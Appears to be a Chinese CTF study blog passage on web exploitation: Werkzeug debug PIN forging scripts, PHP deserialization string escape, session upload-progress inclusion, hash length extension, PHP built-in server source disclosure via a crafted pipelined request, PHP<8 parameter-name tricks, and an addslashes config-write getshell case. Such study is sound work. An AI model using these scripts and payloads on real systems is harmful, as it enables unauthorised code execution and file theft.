<p><a data-fancybox="gallery" data-src="/Notes/image-20230617144803167.png"><img src="/Notes/image-20230617144803167.png" alt="image-20230617144803167"></a></p>
<p>因为PIN rce实现是需要设置cookie头的，而且实际进行时会发现 PIN RCE 无法进行<code>CRLF</code>拆分注入，因为它根本不解析回车换行，只能一行行进行输入，所以很难实现</p>
<h2 id="PIN-码如何生成"><a href="#PIN-码如何生成" class="headerlink" title="PIN 码如何生成"></a>PIN 码如何生成</h2><p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>
<p>在</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.run(debug = <span class="literal">True</span>)app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码敲断点，发现了<code>get_pin_and_cookie_name</code>函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    Pin was explicitly disabled</span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line">​</span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line">​</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">​</span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>

<p><strong>生成要素：</strong></p>
<blockquote>
<p>username<br>通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd<br>引用<br>modname<br>通过getattr(mod,“file”,None)读取，默认值为flask.app<br>引用<br>appname<br>通过getattr(app,“name”,type(app).name)读取，默认值为Flask<br>引用<br>moddir<br>当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取<br>引用<br>uuidnode<br>通过uuid.getnode()读取，通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算<br>引用<br>machine_id<br>每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：</p>
<p>1.&#x2F;etc&#x2F;machine-id (&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</p>
<p>2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p>3.&#x2F;proc&#x2F;self&#x2F;cgroup</p>
</blockquote>
<blockquote>
<p><strong>不同版本算法区别</strong><br>3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同</p>
</blockquote>
<h3 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h3><p>3.6 MD5</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">​</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>3.8 SHA-1</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">​</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><blockquote>
<p>变短吸收后面，变长挤掉后面</p>
<p>s:5:”12345”中</p>
<p>5是说明也是限制，后面的5个字符都属于字符串</p>
<p>s:5:”1234””中</p>
<p>1234”也算是字符串，”不起闭合作用</p>
<ol>
<li><p>如变长</p>
<blockquote>
<p>x-&gt;yy</p>
<p>s:6:”xxxxxx”</p>
<p>filter后</p>
<p>s:6:”yyyyyyyyyyyy”(反序列化会报错)</p>
</blockquote>
<p>所以修改一下filter前的</p>
<blockquote>
<p>s:6:”xxx”;}”</p>
<p>其中字符串为xxx”;} 这6个，但是当x-&gt;yy后，xxx变长为6位xxxxxx</p>
<p>s:6:”yyyyyy”;}”</p>
<p>字符串就为yyyyyy了，<code>&quot;;&#125;</code>就实现了成功逃逸，将语句闭合，当然逃逸数据可以修改，长度刚好为变长部分长度</p>
</blockquote>
</li>
<li><p>如变短</p>
<blockquote>
<p>xx-&gt;y</p>
<p>s:6:”xxxxxx”;}O:5</p>
<p>filter后</p>
<p>s:6:”yyy”;}O:5(反序列化会报错)</p>
</blockquote>
<p>所以修改一下filter前的</p>
<blockquote>
<p>s:18:”<code>xxxxxxxxxxxxxxxxxx</code>“;s:23:”<code>a&quot;;&#125;O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>“;}O:5</p>
<p>其中字符串为这16个，但是当xx-&gt;y后，xxxxxxxxxxxxxxxxxx变短为9位xxxxxxxxx</p>
<p>s:18:”<code>yyyyyyyyy&quot;;s:23:&quot;a</code>“;}O:4:{s:4:”hacker”;}”;}O:5</p>
<p>字符串就为<code>yyyyyyyyy&quot;;s:23:&quot;a</code>了，</p>
<p>而;}就将其闭合了，而后<code>O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>就逃出来了</p>
<p>变短就是数一下后面需要吞掉截断的字符串到其最后一个引号的字符个数，要是filter数据长度的一半</p>
</blockquote>
</li>
</ol>
</blockquote>
<h1 id="session进行文件包含"><a href="#session进行文件包含" class="headerlink" title="session进行文件包含"></a>session进行文件包含</h1><blockquote>
<p><code>session包含需要session打开，没打开怎么办，页面没有session</code></p>
</blockquote>
<h2 id="session-upload-progress作用？"><a href="#session-upload-progress作用？" class="headerlink" title="session.upload_progress作用？"></a><code>session.upload_progress</code>作用？</h2><blockquote>
<p><code>session.upload_progress.enabled</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.cleanup</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.prefix</code> &#x3D; “<strong>upload_progress_</strong>“</p>
<p><code>session.upload_progress.name</code> &#x3D; “<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>“</p>
</blockquote>
<blockquote>
<p><code>session.upload_progress.enabled</code>可以控制是否开启session.upload_progress功能</p>
<p><code>session.upload_progress.cleanup</code>可以控制是否在上传之后删除文件内容</p>
<p><code>session.upload_progress.prefix</code>可以设置上传文件内容的前缀</p>
<p><code>session.upload_progress.name</code>的值即为session中的键值</p>
</blockquote>
<p>session.upload_progress开启之后，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传</p>
<p>进度等)存储在session当中。</p>
<p><strong>初始化session</strong></p>
<p><code>session.use_strict_mode</code>是一个PHP配置选项，它指定了在使用cookie存储会话ID时是否启用严格模式。当启用严格模式时，会话</p>
<p>ID只能通过HTTPS连接传输，并且不能通过URL参数传递。这可以防止会话劫持攻击。如果未启用严格模式，则会话ID可以通过HTTP连</p>
<p>接传输，并且可以通过URL参数传递。这可能会导致会话劫持攻击。默认情况下，<code>session.use_strict_mode</code>设置为0（禁用）</p>
<h1 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h1><blockquote>
<p>学习文章</p>
<p><a href="https://j-kangel.github.io/2019/04/05/hash-attack/">hash长度扩展攻击 | KANGEL (j-kangel.github.io)</a></p>
</blockquote>
<blockquote>
<p>Hash长度拓展攻击（Length Extension Attack）是一种针对特定类型哈希算法的攻击技术。哈希算法是一种将任意大小的数据转换成固定大小哈希值（通常是一串十六进制字符）的算法。这些哈希值通常用于校验数据完整性和验证数据的唯一性。</p>
<p>在正常情况下，哈希算法的输出长度是固定的，而且算法是不可逆的，意味着从哈希值恢复原始数据是非常困难的。但是，由于一些哈希算法的设计问题，存在一种被称为“Hash长度拓展攻击”的漏洞。</p>
<p>Hash长度拓展攻击利用了特定哈希算法的漏洞，使攻击者能够根据已知的哈希值和原始数据的部分内容生成一个新的有效哈希值，而无需知道原始数据的其余部分。攻击者能够在已知哈希值的基础上构造出一个新的哈希值，看起来就像是在已知数据后附加了其他内容，并且新的哈希值也是有效的。</p>
</blockquote>
<h2 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h2><p>先放图，（虽然上了密码学课</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904224135156.png"><img src="/Notes/image-20230904224135156.png" alt="image-20230904224135156"></a></p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904223823110.png"><img src="/Notes/image-20230904223823110.png" alt="image-20230904223823110"></a></p>
<p>总共可以分为，</p>
<blockquote>
<ol>
<li>把消息分为n个分组</li>
<li>对最后一个消息分组进行填充</li>
<li>和输入量进行运算，运算结果位下一个分组的输入量</li>
<li>输出最终结果</li>
</ol>
</blockquote>
<p>MD5算法输入的消息以<code>512bit</code>的分组为单位处理，共<code>64byte</code></p>
<p>然后对每个分组进行加密，前一次的加密的结果会作为这一次加密的输入，最后一次加密的结果即为最终的MD5值。</p>
<p><code>不足64字节的分组</code>需要进行<code>补位</code>，也就是字节填充。</p>
<blockquote>
<p>补位原则：首先将需要hash的字符串进行分组，即<code>字符串长度</code>（以字节为单位）整除64，最后一组<code>不足56字节</code>的进行字节填充。填充的第一个字节为<code>0x80</code>，其他均为<code>0x00</code>。剩下的<code>8个字节</code>(64bit)用来表示原字符串的长度。</p>
</blockquote>
<hr>
<p>拿<code>*CTF 2023 jwt2struts</code>题目为例</p>
<blockquote>
<p>$_COOKIE[“digest”] 要求为 md5($salt.$username.$password)<br>要满足$username &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; $password !&#x3D; “root”<br>&#x2F;&#x2F;$salt &#x3D; XXXXXXXXXXXXXX &#x2F;&#x2F; the salt include 14 characters<br>&#x2F;&#x2F;md5($salt.”adminroot”)&#x3D;e6ccbf12de9d33ec27a5bcfb6a3293df</p>
</blockquote>
<p>这个是提示，发现我们知道了<code>md5($salt.&quot;adminroot&quot;)</code>的值，也就是我们的目的MD5值，再加上我们想要加密的字符串，<code>salt的长度已知</code>，后段的<code>adminroot</code>已知</p>
<p>符合情形，</p>
<blockquote>
<ol>
<li>已知需要加密的字段（如，已知adminroot）</li>
<li>已知salt的长度，但不知道具体值</li>
</ol>
</blockquote>
<p>可以直接用工具<code>hashdump</code>即可</p>
<h1 id="php"><a href="#php" class="headerlink" title="php&lt;&#x3D;7.4.21 内置服务器任意文件读取"></a>php&lt;&#x3D;7.4.21 内置服务器任意文件读取</h1><blockquote>
<p><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p>
</blockquote>
<p>羊城杯遇到的知识点，在<code>php&lt; = 7.4.21</code>任意文件读取</p>
<p>开始看到这个页面其实很陌生</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904170556437.png"><img src="/Notes/image-20230904170556437.png" alt="image-20230904170556437"></a></p>
<p>和常见的<code>apache</code>以及<code>nginx</code>的404都不一样</p>
<p>搜了一下发现是php内置服务器搭建的网站</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904205656790.png"><img src="/Notes/image-20230904205656790.png" alt="image-20230904205656790"></a></p>
<blockquote>
<p>ps.后面看其他人wp才知道，可以扫描网站的，怕被封号没扫，网站下有个<code>start.sh</code>，里面就给出了网站的<code>启动命令</code>和<code>flag</code>的位置，结果我还取解密看重定向响应，麻了</p>
</blockquote>
<p>当然题目是反序列化读文件，但是我们得先读取到源码内容，</p>
<p>网站中想要读取php的源码一般是<code>rce</code>和<code>文件包含</code>才能得到，但是题目只给了<code>404</code>页面，以及有个待读取源码的<code>p0p.php</code>文件</p>
<p>利用php内置服务器而不靠中间件搭建的网站，真的安全吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>

<p>利用万能ai给出文章网站</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904171442398.png"><img src="/Notes/image-20230904171442398.png" alt="image-20230904171442398"></a></p>
<p>在php&lt;&#x3D;7.4.21版本中，利用php内置服务器搭建的网站存在任意文件读取，但也只是只能读取该命令执行所在目录下的文件，不过正好可以读出<code>p0p.php</code>的内容</p>
<p>但是题目关了，知识点，我在<code>wsl</code>复现一下</p>
<hr>
<blockquote>
<p>环境：</p>
<p><code>wsl2 系统kali</code></p>
<p><code>php版本 7.0.33</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904174618539.png"><img src="/Notes/image-20230904174618539.png" alt="image-20230904174618539"></a></p>
<p>我在命令启动的目录下生成了一个<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag&#123;test&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag_is_here&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常访问只能看到<code>flag_is_here</code></p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904174602793.png"><img src="/Notes/image-20230904174602793.png" alt="image-20230904174602793"></a></p>
<p>但是看不到<code>flag&#123;test&#125;</code></p>
<p>但是通过构造特殊结构的请求体就可以访问成功，</p>
<blockquote>
<p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 172.28.31.86:8888</p>
<p>GET &#x2F; HTTP&#x2F;1.1</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904174755615.png"><img src="/Notes/image-20230904174755615.png" alt="image-20230904174755615"></a></p>
<p>发现<code>flag.php</code>的内容被完全显示出来，而服务器中的访问数据只是访问了首页</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904175028098.png"><img src="/Notes/image-20230904175028098.png" alt="image-20230904175028098"></a></p>
<blockquote>
<p>原理有点绕，可以看看<code>7.4.21</code>和<code>7.4.22</code>的区别分析一下</p>
</blockquote>
<h2 id="7-4-21"><a href="#7-4-21" class="headerlink" title="7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现"></a>7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</h2><p>当然并不是高版本就不行了，，其实高版本也存在这个漏洞</p>
<p>在低于<code>8.0.2</code>版本的<code>php</code>，如果想要复现这个漏洞需要满足一个条件，就是命令执行所在的目录下必须没有<code>index.php</code>文件才可以实现</p>
<h3 id="低版本有index-php情况"><a href="#低版本有index-php情况" class="headerlink" title="低版本有index.php情况"></a>低版本有<code>index.php</code>情况</h3><p>我们先在<code>7.0.33</code>版本下生成一个<code>index.php</code>文件，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;welcome index!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20230904180249243.png"><img src="/Notes/image-20230904180249243.png" alt="image-20230904180249243"></a></p>
<p>发现在低版本下如果在目录执行的目录下有<code>index.php</code>，也无法进行任意文件内容的读取</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>想要实现php内置服务器任意文件读取，首先是要满足版本要求，其次需要满足，对方执行搭建内置服务器的目录下没有index.php文件，才可以实现任意文件内容的一个读取，不过一般的开发者都不会把php内置服务器搭建的网站挂在公网上，不过这个漏洞也是一个值得考虑的一个利用点</p>
</blockquote>
<h1 id="php-8非法参数名传参"><a href="#php-8非法参数名传参" class="headerlink" title="php &lt; 8非法参数名传参"></a>php &lt; 8非法参数名传参</h1><p>当传参<code>$_REQUEST[&#39;mo chu.&#39;]</code></p>
<p>参数名中含有<code>空格</code>和<code>点</code>，可以看到当我们传入<code>?mo chu. =xxx</code>时，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，这样的参数名确实无法传参。</p>
<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p>
<p>Payload如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?mo[chu.<span class="number">7</span>=xxx</span><br></pre></td></tr></table></figure>

<p>利用了如果传入的参数名出现了中括号<code>[</code>只替换一次的原理，使得传入的参数为：<code>mo_chu.7</code></p>
<p>但是如果出现了多个 <code>[</code>，就无法替换了</p>
<p>在PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线</p>
<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>


<p><code>config.php</code> 的内容如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
